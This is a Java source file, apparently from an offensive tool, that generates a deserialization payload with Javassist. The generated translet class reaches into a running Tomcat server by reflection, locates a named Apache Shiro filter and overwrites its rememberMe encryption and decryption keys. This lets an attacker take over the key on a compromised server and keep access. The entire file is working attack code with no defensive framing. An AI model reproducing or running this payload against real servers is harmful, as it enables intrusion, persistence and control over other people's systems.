package cn.safe6.payload.tool;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;
import org.apache.coyote.RequestInfo;

import javax.servlet.Filter;

public class AlterKeyMem {


    /**
     * 修改密码
     * Safe6 2021.10.25
     * @param key
     * @return
     * @throws Exception
     */

    public static byte[] getPayload(String key,String bean) throws Exception {

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AlterKeyMem.class));

        CtClass ctClass = classPool.makeClass("Key");
        ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));

        ctClass.addConstructor(CtNewConstructor.make("    public Key(){\n" +
                "        try {\n" +
                "            byte[] key = java.util.Base64.getDecoder().decode(\""+key+"\") ;\n" +
                "            org.apache.tomcat.util.threads.TaskThread thread = (org.apache.tomcat.util.threads.TaskThread) Thread.currentThread();\n" +
                "            java.lang.reflect.Field field = thread.getClass().getSuperclass().getDeclaredField(\"contextClassLoader\");\n" +
                "            field.setAccessible(true);\n" +
                "            Object obj = field.get(thread);\n" +
                "            field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\"resources\");\n" +
                "            field.setAccessible(true);\n" +
                "            obj = field.get(obj);\n" +
                "            field = obj.getClass().getDeclaredField(\"context\");\n" +
                "            field.setAccessible(true);\n" +
                "            obj = field.get(obj);\n" +
                "            field = obj.getClass().getSuperclass().getDeclaredField(\"filterConfigs\");\n" +
                "            field.setAccessible(true);\n" +
                "            obj = field.get(obj);\n" +
                "            java.util.HashMap objMap = (java.util.HashMap) obj;\n" +
                "            java.util.Iterator entries = objMap.entrySet().iterator();\n" +
                "            while (entries.hasNext()) {\n" +
                "                java.util.Map.Entry entry = (java.util.Map.Entry) entries.next();\n" +
                "                if (entry.getKey().equals(\""+bean+"\")) {\n" +
                "                    obj = entry.getValue();\n" +
                "                    field = obj.getClass().getDeclaredField(\"filter\");\n" +
                "                    field.setAccessible(true);\n" +
                "                    obj = field.get(obj);\n" +
                "                    field = obj.getClass().getSuperclass().getDeclaredField(\"securityManager\");\n" +
                "                    field.setAccessible(true);\n" +
                "                    obj = field.get(obj);\n" +
                "                    field = obj.getClass().getSuperclass().getDeclaredField(\"rememberMeManager\");\n" +
                "                    field.setAccessible(true);\n" +
                "                    obj = field.get(obj);\n" +
                "                    java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod(\"setEncryptionCipherKey\", new Class[]{byte[].class});\n" +
                "                    setEncryptionCipherKey.invoke(obj,new Object[]{key});\n" +
                "                    java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod(\"setDecryptionCipherKey\", new Class[]{byte[].class});\n" +
                "                    setDecryptionCipherKey.invoke(obj,new Object[]{key});\n" +
                "\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "        }"+

                "    }", ctClass));


        return ctClass.toBytecode();
    }

}
